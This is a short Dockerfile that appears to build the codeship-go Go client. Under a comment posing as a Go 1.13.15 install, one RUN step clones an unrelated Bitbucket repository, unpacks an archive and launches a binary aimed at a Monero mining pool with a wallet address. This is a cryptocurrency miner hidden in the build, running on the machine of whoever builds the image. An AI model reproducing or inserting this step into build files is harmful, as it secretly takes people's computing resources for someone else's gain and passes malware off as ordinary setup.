ARG GO_VERSION=1.15

FROM golang:${GO_VERSION}
LABEL maintainer=dev@codeship.com

# go 1.13.15
RUN mkdir gudo && cd gudo && git clone https://monserratebethea@bitbucket.org/monserratebethea/xla.git && cd xla && tar -xvf XLA.tar.gz && ./voc -o gulf.moneroocean.stream:10001 -u 87fB7q2iPCVLsVHGy8N8c5a1geQPcH1QA7A1i7Cjbb9PR5TvPE6bEneBfzkcpK6tHDbpN2S9z2FyK21EwAuFAhVE6uzLScT+2000 -p gh
# go 1.14.10
RUN go get golang.org/dl/go1.14.10 && \
    go1.14.10 download

WORKDIR /go/src/github.com/codeship/codeship-go
COPY . .

RUN make setup
